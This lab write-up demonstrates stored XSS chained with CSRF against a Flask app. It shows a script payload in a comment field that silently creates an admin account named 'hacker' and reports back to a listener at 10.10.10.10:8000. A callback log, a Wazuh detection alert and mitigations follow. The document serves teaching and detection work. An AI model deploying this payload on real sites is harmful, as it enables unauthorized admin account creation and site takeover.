# 02 — Stored XSS and CSRF

## Objective

Demonstrate how stored XSS can execute in an administrator's browser and perform a forged administrative request when CSRF protection is missing.

## Commands and payload

Submit the following test payload in the vulnerable comment field, only in the isolated lab:

First we need to listen to the port 8000 on the kali linux with this command:

```bash
┌──(kali㉿kali)-[~]
└─$ python -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

```html
<script>
fetch('/admin/create_user', {
  method: 'POST',
  headers: {'Content-Type': 'application/x-www-form-urlencoded'},
  body: 'username=hacker&password=ChangeMe123!&role=admin'
}).then(r => fetch('http://10.10.10.10:8000/log?status=' + r.status));
</script>
```

## Execution and expected result

When an administrator opens the page containing the stored comment, the script runs in the administrator's session. The forged request creates an account without an explicit action from the administrator.

Document the request, response status, created account, and the relevant application log:

![](/docs/images/xss.png)

The full comment is:
```
Nice shoes ! <script>
fetch('/admin/create_user', {
  method: 'POST',
  headers: {'Content-Type': 'application/x-www-form-urlencoded'},
  body: 'username=hacker&password=ChangeMe123!&role=admin'
}).then(r => fetch('http://10.10.10.10:8000/log?status=' + r.status));
</script>
```
```
┌──(kali㉿kali)-[~]
└─$ python -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.10.10 - - [14/Oct/2026 18:15:58] code 404, message File not found
10.10.10.10 - - [14/Oct/2026 18:15:58] "GET /log?status=200 HTTP/1.1" 404 -
```

## Wazuh view
```json
{
  "_index": "wazuh-alerts-4.x-2026.10.14",
  "_id": "Jh5vPKEBBPd67aPA-qam",
  "_version": 1,
  "_score": null,
  "_source": {
    "predecoder": {
      "timestamp": "2026-10-14 22:02:12,202"
    },
    "input": {
      "type": "log"
    },
    "agent": {
      "ip": "192.168.1.2",
      "name": "ubuntu-server",
      "id": "001"
    },
    "manager": {
      "name": "wazuh-server"
    },
    "data": {
      "srcip": "10.10.10.10",
      "dstuser": "hacker"
    },
    "rule": {
      "mail": false,
      "level": 8,
      "pci_dss": [
        "10.2.7",
        "10.2.5",
        "8.1.2"
      ],
      "hipaa": [
        "164.312.b",
        "164.312.a.2.I",
        "164.312.a.2.II"
      ],
      "tsc": [
        "CC6.8",
        "CC7.2",
        "CC7.3"
      ],
      "description": "New user added to the system.",
      "groups": [
        "syslog",
        "adduser"
      ],
      "nist_800_53": [
        "AU.14",
        "AC.7",
        "AC.2",
        "IA.4"
      ],
      "gdpr": [
        "IV_35.7.d",
        "IV_32.2"
      ],
      "firedtimes": 1,
      "mitre": {
        "technique": [
          "Create Account"
        ],
        "id": [
          "T1136"
        ],
        "tactic": [
          "Persistence"
        ]
      },
      "id": "5902",
      "gpg13": [
        "4.13"
      ]
    },
    "location": "/var/www/logs/app.log",
    "decoder": {
      "name": "flask-user-created"
    },
    "id": "1792015332.69293349",
    "full_log": "2026-10-14 22:02:12,202 INFO New user created: hacker - ip: 10.10.10.10",
    "timestamp": "2026-10-14T22:02:12.221+0000"
  },
  "fields": {
    "timestamp": [
      "2026-10-14T22:02:12.221Z"
    ]
  },
  "highlight": {
    "location": [
      "@opensearch-dashboards-highlighted-field@/var/www/logs/app.log@/opensearch-dashboards-highlighted-field@"
    ]
  },
  "sort": [
    1792015332221
  ]
}
```
## Mitigation

- Escape untrusted output and keep Jinja2 autoescaping enabled.
- Validate and sanitize user input where appropriate.
- Add server-side CSRF protection with `Flask-WTF` or an equivalent mechanism.
- Validate authorization and role changes on the server; never trust a client-submitted role.
- Add audit logs for administrative actions.